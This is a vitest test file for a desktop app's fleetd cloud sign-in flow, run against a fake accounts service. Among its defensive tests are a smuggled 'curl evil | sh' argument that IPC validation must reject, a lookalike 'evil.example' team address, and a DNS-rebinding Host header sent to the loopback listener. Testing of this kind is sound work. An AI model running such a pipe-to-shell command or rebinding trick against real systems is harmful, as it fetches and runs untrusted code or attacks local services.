// Sign in to fleetd cloud against the repo's stand-in accounts service and WorkOS page (fleetd/test/fake-accounts.ts),
// with a browser that follows the page straight back to the app's loopback port. Nothing connects until finish: the
// page has named the account and asked about each invitation by then.
import { request } from "node:http";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { FakeAccounts } from "../../../../../fleetd/test/fake-accounts.ts";
import { IPC } from "../../shared/channels";
import type { CallOutcome } from "../../shared/hub";
import { parseRequest } from "../../shared/ipc";
import { CloudAccount, type CloudPorts, type SavedAccount } from "./account";
import { cloudConfig } from "./config";

/** The app's side of each team: its key and label, and what each hub was asked at sign-out. */
interface Hub {
  id: string;
  url: string;
  key: string;
  label: string;
  invited: boolean;
  calls: string[];
  offline?: boolean;
  /** Refuses device_revoke itself (a role that may not), as a hub's tool error. */
  forbids?: boolean;
  /** The hub has refused this app's key since. */
  refused?: boolean;
}

let made = 0;

/**
 * The app's side, over `hubs` (a list a test may share between two sign-ins, as one app's): a hub already listed at an
 * address takes the new key, as Hubs does, and keeps having been joined by invitation.
 */
const setup = (fake: FakeAccounts, over: Partial<CloudPorts> & { email?: string; deny?: boolean; hubs?: Hub[] } = {}) => {
  const hubs: Hub[] = over.hubs ?? [];
  let saved: SavedAccount | null = null;
  const pages: string[] = [];
  const opened: string[] = [];
  const config = cloudConfig(fake.url, fake.clientId, true, fake.authorizeUrl);
  const cloudHub = (h: Hub) => ({
    id: h.id,
    label: h.label,
    url: h.url,
    call: (tool: string, input: unknown): Promise<CallOutcome> => {
      h.calls.push(`${tool} ${JSON.stringify(input)}`);
      if (h.offline === true) return Promise.resolve({ ok: false, error: { code: "offline", message: "Not connected." } });
      if (tool === "people_list") return Promise.resolve({ ok: true, output: { people: [], devices: [], invites: [], thisDevice: `K-${h.key}` } });
      if (h.forbids === true) return Promise.resolve({ ok: false, error: { code: "forbidden", message: "Only an admin may." } });
      // As a hub does: revoking the caller's own key closes its socket (4401) before any answer, so the call fails
      // the way the client fails it, and the hub refuses the key from then on.
      h.refused = true;
      return Promise.resolve({ ok: false, error: { code: "forbidden", message: "The hub refused the key (unauthorized)." } });
    },
    refused: () => h.refused === true,
  });
  const ports: CloudPorts = {
    config,
    local: true,
    fetch: (url, init) => fetch(url, init),
    // The browser: WorkOS's page signs the person in and sends them back.
    open: (url) => {
      opened.push(url);
      const back = fake.authorize(url, over.email ?? "sam@acme.example", over.deny === true);
      void fetch(back).then(async (r) => pages.push(`${String(r.status)} ${await r.text()}`));
      return Promise.resolve();
    },
    deviceName: () => "devbox",
    connect: (url, key, label, invited) => {
      const at = hubs.find((h) => h.url === url);
      if (at === undefined) hubs.push({ id: `h${String(++made)}`, url, key, label, invited, calls: [] });
      else Object.assign(at, { key, invited: at.invited || invited, refused: false });
      return { ok: true };
    },
    cloudHubs: () => hubs.map(cloudHub),
    heldAt: (origin) => {
      const at = hubs.find((h) => h.url === origin);
      return at === undefined ? null : cloudHub(at);
    },
    forget: (id) => hubs.splice(hubs.findIndex((h) => h.id === id), 1),
    load: () => saved,
    save: (a) => (saved = a),
    ...over,
  };
  return { account: new CloudAccount(ports), ports, hubs, pages, opened, saved: () => saved };
};

/** Signs in and says it's them, joining the invitations at `join`. */
const signInAll = async (account: CloudAccount, join: number[] = []) => {
  const arrived = await account.signIn();
  return arrived.ok ? account.finish(join) : arrived;
};

describe("signing in to fleetd cloud", () => {
  let fake: FakeAccounts;
  beforeEach(async () => {
    fake = await new FakeAccounts().start();
  });
  afterEach(async () => {
    await fake.stop();
  });

  it("takes no arguments from the page but the hub for Connect this computer", () => {
    expect(parseRequest(IPC.cloudSignIn, []).ok).toBe(true);
    expect(parseRequest(IPC.cloudSignIn, [{ code: "x" }]).ok).toBe(false);
    expect(parseRequest(IPC.cloudConnectComputer, ["hub"]).ok).toBe(true);
    expect(parseRequest(IPC.cloudConnectComputer, ["hub", "curl evil | sh"]).ok).toBe(false);
  });

  it("first sign-in: WorkOS's page with PKCE, the person's new team made, its key kept, and only the email and session kept", async () => {
    const { account, hubs, pages, opened, saved } = setup(fake);
    expect(account.state()).toEqual({ available: true, email: null });
    // Back from the browser, the account is named and nothing is connected or kept until the person says it's them.
    expect(await account.signIn()).toEqual({ ok: true, arrival: { email: "sam@acme.example", invitations: [] } });
    expect(hubs).toEqual([]);
    expect(saved()).toBeNull();
    expect(fake.keys).toEqual([]);
    const out = await account.finish([]);
    expect(out).toEqual({ ok: true, email: "sam@acme.example", teams: [{ name: "sam", ok: true }] });
    const page = new URL(opened[0] ?? "");
    expect(page.searchParams.get("code_challenge_method")).toBe("S256");
    expect(page.searchParams.get("redirect_uri")).toMatch(/^http:\/\/127\.0\.0\.1:\d+\/signin\/callback$/u);
    expect(fake.signIns[0]?.deviceName).toBe("devbox");
    expect(hubs.map((h) => [h.label, h.key])).toEqual([["sam", fake.keys[0]?.key]]);
    expect(saved()).toEqual({ email: "sam@acme.example", sessionId: [...fake.sessions][0] });
    expect(Object.keys(saved() ?? {}).sort()).toEqual(["email", "sessionId"]);
    expect(account.state()).toEqual({ available: true, email: "sam@acme.example" });
    await expect.poll(() => pages[0]).toMatch(/^200 .*Signed in to fleetd/su);
  });

  it("two teams: both connect, each with its own key, and no picker", async () => {
    await fake.team("acme", ["sam@acme.example"]);
    await fake.team("side", ["sam@acme.example"]);
    const { account, hubs } = setup(fake);
    const out = await signInAll(account);
    expect(out).toEqual({ ok: true, email: "sam@acme.example", teams: [{ name: "acme", ok: true }, { name: "side", ok: true }] });
    expect(hubs.map((h) => h.label)).toEqual(["acme", "side"]);
    expect(new Set(hubs.map((h) => h.key)).size).toBe(2);
  });

  it("a team whose code is refused is named; the others still connect", async () => {
    await fake.team("acme", ["sam@acme.example"]);
    await fake.team("old", ["sam@acme.example"], { refusePairing: true });
    const { account, hubs } = setup(fake);
    const out = await signInAll(account);
    expect(out.ok).toBe(true);
    if (!out.ok) return;
    expect(out.teams).toEqual([
      { name: "acme", ok: true },
      { name: "old", ok: false, failure: { code: "pair_code_invalid", message: "old refused this app's code: That pairing code is unknown or was already used.", fix: "Sign in again for a new code." } },
    ]);
    expect(hubs.map((h) => h.label)).toEqual(["acme"]);
  });

  it("no team connected: a failure, nothing kept, and the session ended", async () => {
    await fake.team("old", ["sam@acme.example"], { refusePairing: true });
    const { account, hubs, saved } = setup(fake);
    const out = await signInAll(account);
    expect(out.ok).toBe(false);
    expect(hubs).toEqual([]);
    expect(saved()).toBeNull();
    await expect.poll(() => fake.sessions.size).toBe(0);
  });

  it("says the service's own refusal as written", async () => {
    fake.refuseNext = { status: 429, failure: { code: "rate_limited", message: "Too many sign-ins from this address.", fix: "Wait a few minutes." } };
    const { account } = setup(fake);
    expect(await account.signIn()).toEqual({ ok: false, failure: { code: "rate_limited", message: "Too many sign-ins from this address.", fix: "Wait a few minutes." } });
  });

  it("the person cancelling on WorkOS's page connects nothing", async () => {
    const { account, hubs } = setup(fake, { deny: true });
    const out = await account.signIn();
    expect(out).toEqual({ ok: false, failure: { code: "refused", message: "The browser came back without signing you in.", fix: "Nothing was changed. Sign in again." } });
    expect(fake.signIns).toEqual([]);
    expect(hubs).toEqual([]);
  });

  it("a code is good once: the same answer sent again is refused", async () => {
    const sent: Array<{ url: string; init: RequestInit }> = [];
    const { account } = setup(fake, {
      fetch: (url, init) => {
        if (url.endsWith("/v1/app/sign-in")) sent.push({ url, init });
        return fetch(url, init);
      },
    });
    expect((await signInAll(account)).ok).toBe(true);
    const [replay] = sent;
    if (replay === undefined) throw new Error("no sign-in was sent");
    const again = await fetch(replay.url, { ...replay.init, signal: null });
    expect(again.status).toBe(401);
  });

  it("Cancel stops the wait, and a page left unfinished runs out", async () => {
    const quiet = setup(fake, { open: () => Promise.resolve() });
    const waiting = quiet.account.signIn();
    await expect.poll(() => quiet.account.link()).toMatch(/^http:\/\/127\.0\.0\.1:\d+\/user_management\/authorize\?/u);
    quiet.account.cancel();
    expect(await waiting).toEqual({ ok: false, cancelled: true });
    expect(quiet.account.link()).toBeNull();
    const slow = setup(fake, { open: () => Promise.resolve(), waitMs: 20 });
    expect(await slow.account.signIn()).toMatchObject({ ok: false, failure: { code: "timeout" } });
  });

  it("sign out: this device's key revoked on each team, the hubs dropped, then the session ended", async () => {
    await fake.team("acme", ["sam@acme.example"]);
    await fake.team("side", ["sam@acme.example"]);
    await fake.team("ops", ["sam@acme.example"]);
    const { account, hubs, saved } = setup(fake);
    await signInAll(account);
    const [acme, side, ops] = hubs;
    if (acme === undefined || side === undefined || ops === undefined) throw new Error("every team should have connected");
    side.offline = true;
    ops.forbids = true;
    const session = [...fake.sessions][0];
    const out = await account.signOut();
    // acme never answered its revoke, the hub closed the socket on the key it revoked: that is the revoke done.
    expect(acme.calls).toEqual(["people_list {}", `device_revoke {"keyId":"K-${acme.key}"}`]);
    expect(out).toEqual({ kept: ["ops", "side"] });
    expect(hubs).toEqual([]);
    expect(saved()).toBeNull();
    expect(fake.ended).toEqual([session]);
    expect(account.state()).toEqual({ available: true, email: null });
  });

  it("a build without both values has no Sign in", () => {
    expect(cloudConfig(undefined, "client_x", false)).toBeNull();
    expect(cloudConfig("https://accounts.fleetd.dev", undefined, false)).toBeNull();
    expect(cloudConfig("http://accounts.fleetd.dev", "client_x", false)).toBeNull();
    expect(cloudConfig("http://127.0.0.1:9", "client_x", false)).toBeNull();
    expect(cloudConfig("https://accounts.fleetd.dev/x", "client_x", false)).toBeNull();
    expect(cloudConfig("https://accounts.fleetd.dev", "client_x", false)?.accountsUrl).toBe("https://accounts.fleetd.dev");
    const off = new CloudAccount({ ...setup(fake).ports, config: null });
    expect(off.state()).toEqual({ available: false, email: null });
  });

  it("an invitation joins nothing at sign-in: it is asked about, Not now leaves it for the next sign-in, Join pairs it", async () => {
    await fake.team("sam", ["sam@acme.example"]);
    await fake.team("acme", ["eve@other.example"]);
    fake.invite("acme", "sam@acme.example", "eve@other.example", "admin");
    const { account, hubs } = setup(fake);
    const arrived = await account.signIn();
    expect(arrived).toEqual({ ok: true, arrival: { email: "sam@acme.example", invitations: [{ name: "acme", invitedBy: "eve@other.example", role: "admin" }] } });
    // Not now: only the person's own team, and the invite is still open on the team.
    expect(await account.finish([])).toEqual({ ok: true, email: "sam@acme.example", teams: [{ name: "sam", ok: true }] });
    expect(hubs.map((h) => h.label)).toEqual(["sam"]);
    expect(fake.keys.map((k) => k.team)).toEqual(["sam"]);
    expect(fake.accepted).toEqual([]);
    expect(fake.invitesOf("acme").map((i) => i.email)).toEqual(["sam@acme.example"]);
    // The next sign-in asks again; Join has the service join it, then pairs it, marked as joined by invitation.
    const again = await account.signIn();
    expect(again.ok && again.arrival.invitations.map((i) => i.name)).toEqual(["acme"]);
    expect(await account.finish([0])).toEqual({ ok: true, email: "sam@acme.example", teams: [{ name: "sam", ok: true }, { name: "acme", ok: true }] });
    expect(fake.accepted).toEqual(["acme sam@acme.example"]);
    expect(hubs.map((h) => [h.label, h.invited])).toEqual([["sam", false], ["acme", true]]);
    expect(fake.keys.find((k) => k.team === "acme")?.email).toBe("sam@acme.example");
  });

  it("no team of their own and one invitation: still asked; Not now connects nothing and keeps nothing", async () => {
    await fake.team("acme", ["eve@other.example"]);
    fake.invite("acme", "new@acme.example", "eve@other.example");
    const { account, hubs, saved } = setup(fake, { email: "new@acme.example" });
    const arrived = await account.signIn();
    expect(arrived).toEqual({ ok: true, arrival: { email: "new@acme.example", invitations: [{ name: "acme", invitedBy: "eve@other.example", role: "member" }] } });
    const out = await account.finish([]);
    expect(out).toEqual({ ok: false, failure: { code: "none_joined", message: "You didn't join a team, so you aren't signed in.", fix: "Sign in again when you want to join it." } });
    expect(hubs).toEqual([]);
    expect(saved()).toBeNull();
    await expect.poll(() => fake.sessions.size).toBe(0);
    expect(await signInAll(account, [0])).toEqual({ ok: true, email: "new@acme.example", teams: [{ name: "acme", ok: true }] });
    expect(hubs.map((h) => [h.label, h.invited])).toEqual([["acme", true]]);
  });

  it("an accept value is good once: a second finish with it joins nothing", async () => {
    await fake.team("acme", ["eve@other.example"]);
    fake.invite("acme", "sam@acme.example", "eve@other.example");
    const accepts: string[] = [];
    const { account } = setup(fake, {
      fetch: async (url, init) => {
        const r = await fetch(url, init);
        if (url.endsWith("/v1/app/sign-in")) accepts.push(...((await r.clone().json()) as { invitations: Array<{ accept: string }> }).invitations.map((i) => i.accept));
        return r;
      },
    });
    expect((await signInAll(account, [0])).ok).toBe(true);
    const again = await fetch(`${fake.url}/v1/app/accept`, { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ accept: accepts[0] }) });
    expect(again.status).toBe(401);
    expect(((await again.json()) as { code: string }).code).toBe("accept_refused");
  });

  it("Not you: nothing connected, nothing kept, and the session ended", async () => {
    await fake.team("acme", ["sam@acme.example"]);
    const { account, hubs, saved } = setup(fake);
    expect((await account.signIn()).ok).toBe(true);
    await account.notMe();
    expect(hubs).toEqual([]);
    expect(saved()).toBeNull();
    expect(fake.keys).toEqual([]);
    expect(fake.ended.length).toBe(1);
    expect(await account.finish([])).toMatchObject({ ok: false, failure: { message: "That sign-in isn't waiting any more." } });
  });

  it("a team address outside the accounts host's domain is refused, and no code goes there", async () => {
    await fake.team("acme", ["sam@acme.example"]);
    const sent: string[] = [];
    // The accounts service at accounts.fleetd.dev answers a team on another domain (the stand-in's own on 127.0.0.1,
    // which only a local build takes, is out of the picture here).
    const { account, hubs } = setup(fake, {
      local: false,
      config: { accountsUrl: "https://accounts.fleetd.dev", clientId: fake.clientId, authorizeUrl: fake.authorizeUrl },
      fetch: async (url, init) => {
        sent.push(url);
        if (url === "https://accounts.fleetd.dev/v1/app/sign-in") {
          const r = await fetch(`${fake.url}/v1/app/sign-in`, init);
          const answer = (await r.json()) as { teams: Array<{ url: string }> };
          return Response.json({ ...answer, teams: answer.teams.map((t) => ({ ...t, url: "https://acme.fleetd.dev.evil.example" })) });
        }
        return fetch(url, init);
      },
    });
    const out = await signInAll(account);
    expect(out).toEqual({ ok: false, failure: { code: "", message: "acme's address isn't one this app connects to.", fix: "Update the app, then sign in again." } });
    expect(hubs).toEqual([]);
    expect(sent.some((u) => u.includes("evil"))).toBe(false);
  });

  it("the loopback listener refuses a request naming another host, and goes on waiting for its own", async () => {
    const statuses: number[] = [];
    const { account } = setup(fake, {
      open: async (url) => {
        const back = new URL(fake.authorize(url, "sam@acme.example"));
        // A page that rebound its own name to 127.0.0.1 sends its own Host.
        statuses.push(
          await new Promise<number>((resolve) => {
            const req = request({ host: "127.0.0.1", port: back.port, path: `${back.pathname}${back.search}`, headers: { host: "rebind.example" } }, (res) => {
              res.resume();
              resolve(res.statusCode ?? 0);
            });
            req.end();
          }),
        );
        void fetch(back);
      },
    });
    expect((await account.signIn()).ok).toBe(true);
    expect(statuses).toEqual([400]);
    expect(fake.signIns.length).toBe(1);
  });

  it("a key a sign-in replaces is revoked on its team first, and an offline team doesn't stop the sign-in", async () => {
    await fake.team("acme", ["sam@acme.example"]);
    await fake.team("side", ["sam@acme.example"]);
    const hubs: Hub[] = [];
    const first = setup(fake, { hubs });
    await signInAll(first.account);
    const [acme, side] = hubs;
    if (acme === undefined || side === undefined) throw new Error("both teams should have connected");
    const old = { acme: acme.key, side: side.key };
    side.offline = true;
    const out = await signInAll(setup(fake, { hubs }).account);
    expect(out).toEqual({ ok: true, email: "sam@acme.example", teams: [{ name: "acme", ok: true }, { name: "side", ok: true }] });
    // Each revoke went over the old key's own link, before the new key took its place.
    expect(acme.calls).toEqual(["people_list {}", `device_revoke {"keyId":"K-${old.acme}"}`]);
    expect(side.calls).toEqual(["people_list {}"]);
    expect([acme.key, side.key]).not.toContain(old.acme);
    expect(side.key).not.toBe(old.side);
  });

  it("another account's sign-in revokes and drops the previous account's teams", async () => {
    await fake.team("acme", ["sam@acme.example"]);
    await fake.team("kims", ["kim@kim.example"]);
    const hubs: Hub[] = [];
    const app = setup(fake, { hubs });
    await signInAll(app.account);
    const [acme] = hubs;
    if (acme === undefined) throw new Error("acme should have connected");
    const oldKey = acme.key;
    const kim = setup(fake, { hubs, email: "kim@kim.example", load: () => app.saved() });
    expect(await signInAll(kim.account)).toEqual({ ok: true, email: "kim@kim.example", teams: [{ name: "kims", ok: true }] });
    expect(acme.calls).toEqual(["people_list {}", `device_revoke {"keyId":"K-${oldKey}"}`]);
    expect(hubs.map((h) => h.label)).toEqual(["kims"]);
  });
});
